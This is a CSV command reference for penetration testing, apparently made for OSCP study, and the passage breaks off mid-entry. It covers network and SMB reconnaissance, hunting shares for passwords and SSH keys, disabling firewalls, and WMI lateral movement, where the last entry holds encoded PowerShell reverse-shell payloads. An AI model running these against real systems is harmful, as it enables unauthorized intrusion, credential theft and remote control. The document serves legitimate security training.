"id","name","category","command","description","subcategory","filled_example","notes","oscp_relevance","examples","educational","related_commands","troubleshooting","flag_explanations","prerequisites","alternatives","next_steps"
"nmap-ping-sweep","Network Ping Sweep","recon","nmap -sn <TARGET_SUBNET>","Discover live hosts on a network without port scanning","","nmap -sn 192.168.1.0/24","Use -sn for host discovery only, no port scan","high","","","","","{""-sn"": ""Ping scan only - disables port scanning to quickly identify live hosts""}","","[""ping-host""]","[""nmap-quick-scan"", ""nmap-service-scan""]"
"nmap-quick-scan","Quick Full Port Scan","recon","nmap -Pn -p- --min-rate=<RATE> <TARGET> -oA <OUTPUT>","Fast scan of all 65535 ports","","nmap -Pn -p- --min-rate=1000 192.168.1.100 -oA quick_scan","Adjust --min-rate based on network stability","high","","","","","{""-Pn"": ""Skip host discovery - assume host is up (useful when ICMP blocked)"", ""-p-"": ""Scan all ports (1-65535) instead of default 1000 common ports"", ""--min-rate"": ""Minimum packet transmission rate per second for speed"", ""-oA"": ""Output in all formats (normal, XML, grepable) for documentation""}","","","[""nmap-service-scan"", ""nmap-udp-scan""]"
"nmap-service-scan","Service Version Detection","recon","nmap -sV -sC -p <PORTS> <TARGET> -oA <OUTPUT>","Detailed service enumeration with default scripts","","nmap -sV -sC -p 80,443,22,21 192.168.1.100 -oA service_scan","Use after quick scan to investigate open ports","high","","","","","{""-sV"": ""Service version detection - probe open ports to determine service/version"", ""-sC"": ""Default NSE scripts - runs safe scripts for enumeration"", ""-p"": ""Specify ports to scan (comma-separated or range)"", ""-oA"": ""Output in all formats for documentation and analysis""}","[""nmap-quick-scan""]","","[""gobuster-dir"", ""enum4linux-smb"", ""smbmap-shares"", ""hydra-ssh""]"
"nmap-vuln-scan","Vulnerability Scan","recon","nmap --script vuln -p <PORTS> <TARGET>","Run vulnerability detection scripts","","nmap --script vuln -p 80,443,445 192.168.1.100","Can be slow, use specific scripts for better performance","medium","","","","","{""--script"": ""Run NSE scripts - 'vuln' category runs all vulnerability scripts"", ""-p"": ""Target specific ports for vulnerability scanning""}","","[""nessus-scan""]",""
"dns-enum","DNS Enumeration","recon","dnsrecon -d <DOMAIN> -t std","Standard DNS enumeration","","dnsrecon -d example.com -t std","Try zone transfer with -t axfr if allowed","medium","","","","","{""-d"": ""Target domain to enumerate"", ""-t"": ""Type of enumeration - 'std' performs standard record queries""}","","[""dnsenum-domain""]",""
"smb-enum","SMB Enumeration","recon","enum4linux -a <TARGET>","Comprehensive SMB/NetBIOS enumeration","","enum4linux -a 192.168.1.100","Check for null sessions and guest access","high","","","","","{""-a"": ""All enumeration - combines -U -S -G -P -r -o -n -i (users, shares, groups, password policy, etc.)""}","[""nmap-service-scan""]","[""smb-enum4linux-full"", ""smb-crackmapexec-shares"", ""smb-null-session-shares"", ""enum4linux-smb""]","[""smb-smbclient-connect"", ""smb-smbmap-recursive"", ""smb-mount-share"", ""hydra-smb-attack""]"
"snmp-enum","SNMP Enumeration","recon","snmpwalk -c <SNMP_COMMUNITY> -v2c <TARGET>","SNMP enumeration with community string","","snmpwalk -c public -v2c 192.168.1.100","Try 'public' and 'private' as default community strings","medium","","","","","{""-c"": ""Community string for authentication (like a password)"", ""-v2c"": ""SNMP version 2c - most common, supports bulk requests""}","","",""
"smb-null-session-shares","SMB Null Session Share Enumeration","recon","smbclient -N -L //<TARGET>","Enumerate SMB shares using null session authentication (anonymous access without credentials)","","smbclient -N -L //192.168.45.100","Null sessions often allowed on older Windows (pre-2000) and misconfigured Samba servers.

This is the first step in SMB enumeration - always try before authenticated methods.

Document all discovered shares in enumeration.md.

Time estimate:
1-2 minutes.

OSCP tip:
If null session works, try accessing IPC$ for further enumeration with rpcclient.","high","","","","{""NT_STATUS_ACCESS_DENIED"": ""Null sessions disabled on target. Try guest authentication: smbclient -U guest%guest -L //<TARGET>"", ""Connection refused"": ""Port 445 filtered by firewall. Try legacy port 139: smbclient -p 139 -N -L //<TARGET>"", ""Protocol negotiation failed"": ""SMBv1 disabled on target. Specify minimum protocol version: smbclient -N -L //<TARGET> --option='client min protocol=SMB2'"", ""No shares visible"": ""Shares may be hidden from listing. Try connecting to common shares directly: C$, ADMIN$, IPC$, Users, Public""}","{""-N"": ""No password - attempts null session authentication (anonymous login without credentials)"", ""-L"": ""List available shares on the target server""}","","[""smb-smbmap-recursive"", ""smb-crackmapexec-shares""]","[""smb-enum4linux-full"", ""smb-smbclient-connect"", ""smb-crackmapexec-shares""]"
"smb-enum4linux-full","Comprehensive SMB Enumeration with enum4linux","recon","enum4linux -a <TARGET>","Comprehensive SMB/NetBIOS enumeration including users, shares, groups, password policy, OS info, and workgroup details","","enum4linux -a 192.168.45.100","enum4linux wraps multiple Samba tools (smbclient, rpcclient, net).

Best used after confirming SMB is accessible.

Time estimate:
3-5 minutes for full scan.

Can be noisy - IDS may detect.

Document findings in enumeration.md:
workgroup name, users, shares, password policy (useful for credential attacks).

OSCP tip:
Look for shares with READ/WRITE access, weak password policies (no complexity, no lockout), and user lists for credential spraying.","high","","","","{""Access denied but null session worked"": ""Some info requires authentication. Get credentials and retry: enum4linux -u <USER> -p <PASS> -a <TARGET>"", ""RID cycling taking too long"": ""Cancel and run faster targeted queries: enum4linux -U <TARGET> (users only), enum4linux -S <TARGET> (shares only)"", ""No domain/workgroup info"": ""Target may be standalone. Focus on share and user enumeration instead of domain queries"", ""Connection timeout"": ""Port 445/139 may be rate-limited. Reduce scan speed or wait before retrying""}","{""-a"": ""All simple enumeration - combines: -U (users), -S (shares), -G (groups), -P (password policy), -r (RID cycling), -o (OS info), -n (NetBIOS), -i (printer info). This is the most thorough single-command SMB enumeration.""}","[""smb-null-session-shares""]","[""smb-crackmapexec-shares"", ""smb-null-session-shares""]","[""smb-smbclient-connect"", ""smb-smbmap-recursive"", ""smb-mount-share""]"
"smb-crackmapexec-shares","CrackMapExec SMB Share Enumeration","recon","crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD> --shares","Enumerate SMB shares with authenticated access using CrackMapExec, showing detailed permission information","","crackmapexec smb 192.168.45.100 -u administrator -p password123 --shares","CrackMapExec is faster than enum4linux for share enumeration with known credentials.

Shows explicit READ/WRITE permissions which is critical for exploitation planning.

Time estimate:
30 seconds.

OSCP tip:
Look for non-standard shares (anything besides C$, ADMIN$, IPC$) and shares with WRITE access - potential for uploading payloads.

For null session:
crackmapexec smb <TARGET> -u '' -p '' --shares.

For multiple targets:
crackmapexec smb <SUBNET> -u <USER> -p <PASS> --shares","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid credentials. Try null session: crackmapexec smb <TARGET> -u '' -p '' --shares"", ""No shares listed but command succeeds"": ""User authenticated but has no share access. Try different user or check for hidden shares: C$, ADMIN$"", ""Connection timeout"": ""Firewall blocking port 445. Try legacy port: crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares --port 139"", ""Kerberos error"": ""Domain authentication failed. Use local auth: crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares --local-auth""}","{""smb"": ""Target SMB protocol (port 445/139)"", ""-u"": ""Username for authentication (use '' or 'guest' for anonymous)"", ""-p"": ""Password for authentication (use '' for empty password or null session)"", ""--shares"": ""Enumerate all accessible shares and display READ/WRITE permissions""}","","[""smb-smbmap-recursive"", ""smb-enum4linux-full""]","[""smb-smbclient-connect"", ""smb-smbmap-recursive"", ""smb-mount-share""]"
"smb-smbclient-connect","Interactive SMB Client Connection","recon","smbclient //<TARGET>/<SHARE> -U <USERNAME>","Connect interactively to an SMB share for manual file browsing, downloading, and uploading","","smbclient //192.168.45.100/Users -U administrator","Interactive mode allows manual exploration which may reveal files missed by automated tools.

Common useful commands:
ls, cd, get, put, mget, mput, recurse, prompt.

Time estimate:
5-15 minutes for manual exploration.

OSCP tips:
(1) Check for readable files in Users directories - look for Desktop, Documents, Downloads.

(2) Check for writable directories - potential for malware upload.

(3) Look for configuration files, scripts, passwords in plaintext.

(4) For null session:
smbclient //<TARGET>/<SHARE> -N.

(5) For scripting:
smbclient //<TARGET>/<SHARE> -U <USER>%<PASS> -c 'ls;get file.txt'","high","","","","{""NT_STATUS_ACCESS_DENIED"": ""No access to this share. Try different shares from enumeration or use guest: -U guest%guest"", ""NT_STATUS_BAD_NETWORK_NAME"": ""Share name incorrect. List shares first: smbclient -N -L //<TARGET>"", ""Connection failed"": ""Port 445 blocked. Try legacy: smbclient //<TARGET>/<SHARE> -U <USER> -p 139"", ""Cannot access subdirectories"": ""Use 'cd <DIR>' to change directories. Use 'recurse ON' + 'prompt OFF' + 'mget *' for bulk download""}","{""//"": ""UNC path format for SMB shares: //<SERVER>/<SHARE>"", ""-U"": ""Specify username for authentication (will prompt for password, or use %<PASS> inline for scripting)""}","[""smb-null-session-shares"", ""smb-crackmapexec-shares""]","[""smb-mount-share"", ""smb-smbmap-recursive""]",""
"smb-smbmap-recursive","Recursive SMB Share Content Enumeration","recon","smbmap -H <TARGET> -u <USERNAME> -p <PASSWORD> -R <SHARE>","Recursively list all files and directories within an SMB share with detailed permissions","","smbmap -H 192.168.45.100 -u administrator -p password123 -R Users","smbmap shows file sizes and permissions which helps prioritize targets.

Use -A flag with patterns to search for specific file types.

Time estimate:
2-5 minutes depending on share size.

OSCP tips:
(1) Look for READ/WRITE directories - potential pivot points.

(2) Common sensitive files:
passwords.txt, users.txt, config.xml, web.config, *.ps1, *.kdbx (KeePass), id_rsa (SSH keys).

(3) Use download:
smbmap -H <TARGET> -u <USER> -p <PASS> --download '<SHARE>\full\path\file.txt'.

(4) For null session:
smbmap -H <TARGET> -u '' -p ''.

(5) Recursively list ALL shares:
smbmap -H <TARGET> -u <USER> -p <PASS> -R (no share specified)","high","","","","{""Access Denied"": ""Credentials invalid or insufficient permissions. Verify with: smbmap -H <TARGET> -u <USER> -p <PASS> (no -R flag)"", ""Too much output"": ""Pipe to file: smbmap ... > smbmap_output.txt, or target specific share: -R <SHARE>"", ""Slow enumeration"": ""Large shares take time. Cancel and use specific share: -R <SHARE> instead of all shares"", ""Cannot find sensitive files"": ""Use search pattern: smbmap -H <TARGET> -u <USER> -p <PASS> -R <SHARE> -A '.txt|.xml|.config|.ps1'""}","{""-H"": ""Target hostname or IP address"", ""-u"": ""Username for SMB authentication"", ""-p"": ""Password for SMB authentication"", ""-R"": ""Recursively list files and directories within specified share (omit share name to recursively list ALL accessible shares)""}","[""smb-crackmapexec-shares""]","[""smb-smbclient-connect"", ""smb-mount-share""]",""
"smb-mount-share","Mount SMB Share Locally","recon","sudo mount -t cifs -o username=<USERNAME>,password=<PASSWORD> //<TARGET>/<SHARE> <MOUNT_POINT>","Mount an SMB share to local filesystem for direct file access and manipulation using standard Linux tools","","sudo mount -t cifs -o username=administrator,password=password123 //192.168.45.100/Users /mnt/smb","Mounting allows using standard Linux tools (grep, find, cat, cp) instead of SMB-specific commands.

Much faster for bulk file operations.

Time estimate:
1 minute to mount.

OSCP tips:
(1) Always create mount point first:
sudo mkdir -p /mnt/smb.

(2) For null session:
username=guest,password='' or username='',password=''.

(3) For guest:
username=guest,password=guest.

(4) Unmount when done:
sudo umount <MOUNT_POINT>.

(5) Check what's mounted:
df -h | grep cifs.

(6) Force unmount if stuck:
sudo umount -f <MOUNT_POINT>.

(7) Use find for sensitive files:
find /mnt/smb -iname '*password*' -o -iname '*.config' -o -iname 'id_rsa'","high","","","","{""Permission denied"": ""Invalid credentials or share not accessible. Verify access first: smbmap -H <TARGET> -u <USER> -p <PASS>"", ""No such file or directory (mount point)"": ""Create mount point first: sudo mkdir -p <MOUNT_POINT>"", ""No such file or directory (share)"": ""Share name incorrect. List shares: smbclient -L //<TARGET> -U <USER>"", ""Host is down"": ""Port 445 blocked or host unreachable. Verify connectivity: sudo nmap -p 445 -Pn <TARGET>"", ""mount.cifs not found"": ""Install cifs-utils: sudo apt install cifs-utils"", ""Password visible in mount output"": ""Use credentials file: Create /tmp/smbcreds with 'username=<USER>\\npassword=<PASS>', then mount -o credentials=/tmp/smbcreds""}","{""sudo"": ""Required - mounting filesystems requires root privileges"", ""-t cifs"": ""Filesystem type - CIFS (Common Internet File System, SMB protocol implementation)"", ""-o"": ""Mount options - comma-separated: username, password, and other options"", ""username="": ""SMB authentication username"", ""password="": ""SMB authentication password (alternative: use file=<CREDFILE> for security)""}","","[""smb-smbclient-connect"", ""smb-smbmap-recursive""]",""
"curl-header-enum","HTTP Header Enumeration","recon","curl -I -X <METHOD> http://<TARGET>:<PORT>/<PATH>","Enumerate HTTP response headers to identify server technology, versions, and potential security misconfigurations","","curl -I -X GET http://192.168.45.100:80//","Headers often reveal:
Server version (Apache/2.4.41), Backend technology (X-Powered-By:
PHP/7.4.3, ASP.NET), Framework (X-AspNet-Version), WAF presence (X-Sucuri-ID).

Time estimate:
10 seconds.

OSCP tips:
(1) Look for outdated versions - searchsploit material.

(2) X-Powered-By reveals backend language - useful for payload selection.

(3) Test OPTIONS method:
curl -I -X OPTIONS http://<TARGET> - may reveal PUT/DELETE allowed.

(4) Missing security headers = potential vulnerabilities:
X-Frame-Options, X-XSS-Protection, Content-Security-Policy.

(5) For HTTPS:
curl -I -k https://<TARGET> (bypass cert verification).

(6) Verbose for debugging:
curl -I -v http://<TARGET>","high","","","","{""Connection refused"": ""Port incorrect or service down. Verify with: sudo nmap -p <PORT> -Pn <TARGET>"", ""No Server header"": ""Header may be suppressed for security. Try: curl -I -X OPTIONS to see allowed methods"", ""403 Forbidden on /"": ""Try different paths: /admin, /api, /login, or enumerate with gobuster"", ""SSL error for https"": ""Self-signed cert. Use: curl -I -k https://<TARGET> (-k to ignore cert errors)""}","{""-I"": ""Fetch headers only (HEAD request equivalent) - faster than full GET request"", ""-X"": ""Specify HTTP method (GET, POST, OPTIONS, PUT, DELETE, TRACE) - useful for testing allowed methods""}","","[""whatweb-technology-detection"", ""nmap-service-scan""]","[""whatweb-technology-detection""]"
"whatweb-technology-detection","Web Technology Fingerprinting","recon","whatweb -v -a 3 http://<TARGET>:<PORT>","Identify web technologies, CMS platforms, frameworks, JavaScript libraries, server info, and versions","","whatweb -v -a 3 http://192.168.45.100:80","whatweb identifies:
CMS (WordPress, Joomla, Drupal), Web servers (Apache, nginx, IIS), Languages (PHP, ASP.NET, Python), Frameworks (Laravel, Django, Rails), JavaScript libraries (jQuery, Bootstrap), WAFs, Analytics.

Time estimate:
30-60 seconds.

OSCP tips:
(1) Prioritize CMS detection - WordPress/Joomla often have known vulns.

(2) Version numbers critical - check searchsploit immediately.

(3) For multiple URLs:
whatweb -i urls.txt.

(4) Check both HTTP and HTTPS:
whatweb http://<TARGET> https://<TARGET>.

(5) Look for development/staging indicators:
X-Debug, X-Error, verbose error messages.

(6) Admin panels:
/wp-admin (WordPress), /administrator (Joomla), /admin","high","","","","{""Connection timeout"": ""Increase timeout: whatweb -v -a 3 --wait 5 http://<TARGET> (5 second timeout)"", ""Too much output"": ""Reduce aggression: whatweb -a 1 http://<TARGET> (stealthy mode)"", ""No technologies detected"": ""Increase aggression: whatweb -v -a 4 http://<TARGET> or try --force-text for unusual responses"", ""SSL certificate error"": ""Use -k flag: whatweb -v -a 3 https://<TARGET> (bypass cert verification)""}","{""-v"": ""Verbose mode - displays detailed information about detected technologies"", ""-a"": ""Aggression level (1-4): 1=stealthy, 3=aggressive (default recommended), 4=heavy (may trigger IDS)"", ""3"": ""Aggression level 3 - good balance of thoroughness and stealth for OSCP labs""}","","[""curl-header-enum"", ""nmap-service-scan""]",""
"vhost-fuzzing-gobuster","Virtual Host Discovery with Gobuster","recon","gobuster vhost -u http://<TARGET> -w <WORDLIST> -t <THREADS> --append-domain","Discover virtual hosts (subdomains) by fuzzing the Host header to find hidden web applications on the same IP","","gobuster vhost -u http://example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain","Virtual hosts allow multiple websites on one IP address by routing based on Host header.

Often reveals development/staging environments with weaker security.

Time estimate:
2-5 minutes depending on wordlist size.

OSCP tips:
(1) Always try vhost fuzzing on web servers - hidden apps common in CTFs.

(2) Use quality wordlists:
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt.

(3) After finding vhosts, add to /etc/hosts for browsing:
<IP> subdomain.domain.com.

(4) Common vhosts in OSCP:
dev, staging, admin, api, internal, vpn, mail, blog.

(5) Compare response sizes - identical sizes across all attempts = wildcard response (filter with --exclude-length).

(6) For IP-based scanning:
gobuster vhost -u http://<IP> -w <WORDLIST> --domain target.com --append-domain","high","","","","{""All entries return same size"": ""Server returns same response for all hosts. Filter by size: --exclude-length <SIZE> or try different status codes"", ""No results found"": ""Try common subdomains manually: dev, staging, test, admin, api, mobile, internal"", ""Connection errors"": ""Target may have rate limiting. Reduce threads: -t 10 or add delay: --delay 100ms"", ""Need to scan IP address"": ""Use: gobuster vhost -u http://<IP> -w <WORDLIST> --domain <DOMAIN> --append-domain""}","{""vhost"": ""Virtual host enumeration mode - fuzzes Host header instead of URL path"", ""-u"": ""Target URL (must include http:// or https://)"", ""-w"": ""Wordlist for fuzzing subdomain names"", ""-t"": ""Number of concurrent threads (default 10, increase for faster scanning)"", ""--append-domain"": ""Append base domain to wordlist entries (e.g., 'dev' becomes 'dev.example.com')""}","[""nmap-service-scan""]","[""ffuf-vhost-fuzz""]","[""gobuster-dir"", ""whatweb-technology-detection"", ""nikto-scan""]"
"dns-zone-transfer-dig","DNS Zone Transfer Attempt","recon","dig axfr @<NAMESERVER> <DOMAIN>","Attempt DNS zone transfer (AXFR) to obtain complete DNS records including subdomains, IPs, and mail servers","","dig axfr @192.168.45.100 example.com","Zone transfers should be restricted to authorized secondary nameservers only, but misconfigurations still exist.

Successful transfer provides complete DNS records - massive information disclosure.

Time estimate:
30 seconds.

OSCP tips:
(1) Always try zone transfer first - when it works, it's instant enumeration.

(2) Find nameservers:
dig NS <DOMAIN> then try AXFR on each.

(3) Parse output for subdomains:
dig axfr @<NS> <DOMAIN> | grep -E '^[a-zA-Z0-9]' | awk '{print $1}'.

(4) Look for:
internal hosts, dev/staging servers, admin interfaces, mail servers, database servers.

(5) If transfer fails (common), fallback to:
gobuster dns, dnsrecon -t brt, fierce --domain <DOMAIN>.

(6) UDP port 53 required - check firewall:
sudo nmap -p 53 -sU -Pn <NS>","medium","","","","{""Transfer failed"": ""Zone transfers disabled (proper security). Use subdomain enumeration instead: gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"", ""Connection timeout"": ""Firewall blocking port 53 or nameserver down. Verify: sudo nmap -p 53 -sU -Pn <NAMESERVER>"", ""REFUSED"": ""Nameserver explicitly denies transfer. Try other discovered nameservers from: dig NS <DOMAIN>"", ""Don't know nameserver"": ""Find nameservers first: dig NS <DOMAIN> or host -t ns <DOMAIN>""}","{""axfr"": ""Zone transfer query type - requests complete copy of zone data (AXFR = Authoritative Transfer Full)"", ""@"": ""Specifies which nameserver to query directly""}","","",""
"iptables-list-rules","IPTables - List All Rules","post-exploitation","sudo iptables -L -v -n","Display all iptables firewall rules (Linux)","firewall","","Run with sudo.

Use -t <table> to specify table (filter, nat, mangle, raw)","high","","","","","{""-L"": ""List all rules in selected chain (default: all chains)"", ""-v"": ""Verbose output (shows packet/byte counters, interface)"", ""-n"": ""Numeric output (don't resolve hostnames/ports)""}","","[""ufw-status"", ""firewalld-list-all""]",""
"iptables-allow-port","IPTables - Allow Inbound Port","post-exploitation","sudo iptables -A INPUT -p <PROTOCOL> --dport <PORT> -j ACCEPT","Add iptables rule to allow inbound traffic on specific port","firewall","sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT","Rule is not persistent by default.

Use iptables-save to persist across reboots.","high","","","","","{""-A INPUT"": ""Append rule to INPUT chain (inbound traffic)"", ""-p"": ""Protocol to match"", ""--dport"": ""Destination port to match"", ""-j ACCEPT"": ""Jump target (ACCEPT allows the packet)""}","","[""ufw-allow-port""]",""
"iptables-port-forward","IPTables - Port Forwarding","post-exploitation","sudo iptables -t nat -A PREROUTING -p <PROTOCOL> --dport <SRC_PORT> -j REDIRECT --to-port <DST_PORT>","Forward traffic from one port to another (port forwarding/redirect)","firewall","sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080","Useful for bypassing firewall restrictions or redirecting traffic through allowed ports","high","","","","","{""-t nat"": ""Specify NAT table (for port forwarding)"", ""-A PREROUTING"": ""Append to PREROUTING chain (before routing decision)"", ""-p"": ""Protocol to match"", ""--dport"": ""Destination port (incoming)"", ""-j REDIRECT"": ""Redirect packets to different port"", ""--to-port"": ""Target port for redirection""}","","",""
"iptables-delete-rule","IPTables - Delete Rule by Number","post-exploitation","sudo iptables -D <CHAIN> <RULE_NUMBER>","Delete specific iptables rule by line number","firewall","sudo iptables -D INPUT 3","Use --line-numbers to see rule numbers before deleting","medium","","","","","{""-D"": ""Delete rule from chain"", ""<CHAIN>"": ""Chain containing the rule"", ""<RULE_NUMBER>"": ""Position of rule to delete""}","","",""
"iptables-flush-all","IPTables - Flush All Rules","post-exploitation","sudo iptables -F","Remove all iptables rules (WARNING: may lock you out)","firewall","","WARNING:
May lose SSH access if default policy is DROP.

Use with caution.","medium","","","","","{""-F"": ""Flush (delete) all rules in selected chain or all chains""}","","",""
"ufw-status","UFW - Check Firewall Status","post-exploitation","sudo ufw status verbose","Display UFW (Uncomplicated Firewall) status and rules","firewall","","UFW is the default firewall on Ubuntu/Debian systems","high","","","","","{""status"": ""Show firewall status"", ""verbose"": ""Show detailed rule information""}","","[""iptables-list-rules"", ""firewalld-list-all""]",""
"ufw-allow-port","UFW - Allow Port","post-exploitation","sudo ufw allow <PORT>/<PROTOCOL>","Allow inbound traffic on specific port","firewall","sudo ufw allow 4444/tcp","","high","","","","","{""allow"": ""Allow traffic (creates ACCEPT rule)"", ""<PORT>/<PROTOCOL>"": ""Port and protocol to allow""}","","[""iptables-allow-port""]",""
"ufw-disable","UFW - Disable Firewall","post-exploitation","sudo ufw disable","Disable UFW firewall (allows all traffic)","firewall","","Rules are preserved but not enforced.

Use 'sudo ufw enable' to re-enable.","high","","","","","{""disable"": ""Turn off firewall (does not delete rules)""}","","",""
"firewalld-list-all","Firewalld - List All Rules","post-exploitation","sudo firewall-cmd --list-all","Display all firewalld rules and zones","firewall","","Firewalld is default on RHEL/CentOS/Fedora systems","medium","","","","","{""--list-all"": ""List all zones, services, ports, and rules""}","","[""iptables-list-rules"", ""ufw-status""]",""
"firewalld-add-port","Firewalld - Add Port Rule","post-exploitation","sudo firewall-cmd --zone=public --add-port=<PORT>/<PROTOCOL> --permanent","Allow inbound traffic on specific port","firewall","sudo firewall-cmd --zone=public --add-port=4444/tcp --permanent","","medium","","","","","{""--zone=public"": ""Target zone (usually 'public' for Internet-facing)"", ""--add-port"": ""Add port to allowed list"", ""--permanent"": ""Make rule persistent across reboots""}","","",""
"firewalld-port-forward","Firewalld - Port Forwarding","post-exploitation","sudo firewall-cmd --zone=public --add-forward-port=port=<SRC_PORT>:proto=<PROTOCOL>:toport=<DST_PORT> --permanent","Forward traffic from one port to another","firewall","sudo firewall-cmd --zone=public --add-forward-port=port=80:proto=tcp:toport=8080 --permanent","","medium","","","","","{""--add-forward-port"": ""Add port forwarding rule"", ""port="": ""Source port"", ""proto="": ""Protocol"", ""toport="": ""Destination port"", ""--permanent"": ""Persist across reboots""}","","",""
"netsh-firewall-show","Netsh - Show Firewall Status (Windows)","post-exploitation","netsh advfirewall show allprofiles","Display Windows firewall status and configuration","firewall","","Requires Administrator privileges","high","","","","","{""advfirewall"": ""Advanced firewall configuration"", ""show"": ""Display settings"", ""allprofiles"": ""All profiles (Domain, Private, Public)""}","","[""netsh-firewall-show-state""]",""
"netsh-firewall-show-state","Netsh - Show Firewall State (Legacy)","post-exploitation","netsh firewall show state","Show Windows firewall state (legacy command, works on older Windows)","firewall","","Deprecated but still works on older Windows versions","medium","","","","","{""firewall"": ""Legacy firewall command"", ""show state"": ""Display current firewall state""}","","[""netsh-firewall-show""]",""
"netsh-firewall-add-rule","Netsh - Add Firewall Allow Rule","post-exploitation","netsh advfirewall firewall add rule name=""<RULE_NAME>"" protocol=<PROTOCOL> dir=in localport=<PORT> action=allow","Add Windows firewall rule to allow inbound traffic","firewall","netsh advfirewall firewall add rule name=""Allow_ReverseShell"" protocol=TCP dir=in localport=4444 action=allow","Requires Administrator privileges.

Rule persists across reboots.","high","","","","","{""add rule"": ""Create new firewall rule"", ""name="": ""Rule name (must be unique)"", ""protocol="": ""Network protocol"", ""dir=in"": ""Direction (in=inbound, out=outbound)"", ""localport="": ""Local port number"", ""action=allow"": ""Allow the traffic (vs block)""}","","",""
"netsh-firewall-port-forward","Netsh - Port Forwarding (Windows)","post-exploitation","netsh advfirewall firewall add rule name=""<RULE_NAME>"" protocol=<PROTOCOL> dir=in localip=<LOCAL_IP> localport=<SRC_PORT> action=allow","Forward traffic from one port to another on Windows","firewall","netsh advfirewall firewall add rule name=""port_forward_ssh_2222"" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow","This allows firewall rule.

Use 'netsh interface portproxy' for actual port forwarding.","high","","","","","{""name="": ""Unique rule name"", ""protocol="": ""Network protocol"", ""dir=in"": ""Inbound traffic"", ""localip="": ""Bind to specific local IP"", ""localport="": ""Port to allow"", ""action=allow"": ""Allow the traffic""}","","",""
"netsh-portproxy-add","Netsh - Add Port Proxy (Port Forward)","post-exploitation","netsh interface portproxy add v4tov4 listenport=<SRC_PORT> listenaddress=<LISTEN_IP> connectport=<DST_PORT> connectaddress=<DST_IP>","Create actual port forwarding/proxy rule on Windows","firewall","netsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=127.0.0.1","Useful for pivoting through compromised Windows hosts.

Firewall rule must be added separately.","high","","","","","{""portproxy"": ""Port proxy/forwarding configuration"", ""add v4tov4"": ""Add IPv4 to IPv4 forwarding rule"", ""listenport="": ""Port to accept connections on"", ""listenaddress="": ""IP to bind listener (0.0.0.0 = all interfaces)"", ""connectport="": ""Destination port"", ""connectaddress="": ""Destination IP""}","","",""
"netsh-portproxy-show","Netsh - Show Port Proxy Rules","post-exploitation","netsh interface portproxy show all","List all active port forwarding/proxy rules","firewall","","","high","","","","","{""portproxy"": ""Port proxy/forwarding"", ""show all"": ""Display all forwarding rules""}","","",""
"netsh-firewall-disable","Netsh - Disable Windows Firewall","post-exploitation","netsh advfirewall set allprofiles state off","Turn off Windows firewall for all profiles","firewall","","Requires Administrator privileges.

Very obvious IoC - use with caution.","high","","","","","{""set allprofiles"": ""Configure all profiles (Domain/Private/Public)"", ""state off"": ""Disable firewall""}","","",""
"netsh-firewall-delete-rule","Netsh - Delete Firewall Rule","post-exploitation","netsh advfirewall firewall delete rule name=""<RULE_NAME>""","Remove specific firewall rule by name","firewall","netsh advfirewall firewall delete rule name=""Allow_ReverseShell""","Use to clean up custom rules after exploitation","medium","","","","","{""delete rule"": ""Remove firewall rule"", ""name="": ""Rule name to delete""}","","",""
"ps-wmi-invoke-method","PowerShell WMI Remote Process Creation","exploitation","Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='<COMMAND>'}","Create remote process via WMI using Invoke-CimMethod and Win32_Process class","WMI","Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc'}","","","[{""command"": ""$u='jen';$p='Nexus123!';$s=ConvertTo-SecureString $p -AsPlaintext -Force;$c=New-Object System.Management.Automation.PSCredential $u,$s;$o=New-CimSessionOption -Protocol DCOM;$ses=New-Cimsession -ComputerName 192.168.50.73 -Credential $c -SessionOption $o;Invoke-CimMethod -CimSession $ses -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc'}"", ""description"": ""Complete WMI lateral movement one-liner: Create credentials, establish session, spawn calculator on 192.168.50.73"", ""context"": ""Full WMI attack from single command""}, {""command"": ""Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA...'}"", ""description"": ""Execute base64-encoded PowerShell reverse shell via WMI (assuming session already created)"", ""context"": ""WMI-based reverse shell lateral movement""}, {""command"": ""$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0A...'; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$Command}"", ""description"": ""Store payload in variable first for readability, then execute via WMI"", ""context"": ""Cleaner syntax for complex payloads""}]","{""purpose"": ""Spawn processes remotely via WMI when WinRM unavailable - processes run in session 0 as SYSTEM context, making them invisible to logged-in users"", ""manual_alternative"": ""Deprecated wmic utility: wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create \""<COMMAND>\"""", ""common_failures"": [""Session 0 isolation means GUI apps (calc, notepad) won't be visible to users - only visible in Task Manager"", ""Return value 0 = success, non-zero = failure (check ProcessId in output to verify)"", ""Reverse shells must connect back (target initiates connection to attacker listener)"", ""Firewall blocking high port range (49152-65535) prevents WMI session data transmission""], ""when_to_use"": [""WinRM ports (5985/5986) blocked but RPC (135) available"", ""Need to execute commands without interactive session"", ""Spawning reverse shells during lateral movement"", ""Alternative attack vector when WinRM fails""], ""exam_relevance"": ""MEDIUM - Important backup technique when WinRM unavailable. Demonstrates protocol diversity for lateral movement."", ""time_estimate"": ""5-10 seconds per command execution"", ""technical_notes"": [""Processes created by WMI run as SYSTEM in session 0 (services context)"", ""WMI uses RPC over port 135 + dynamic 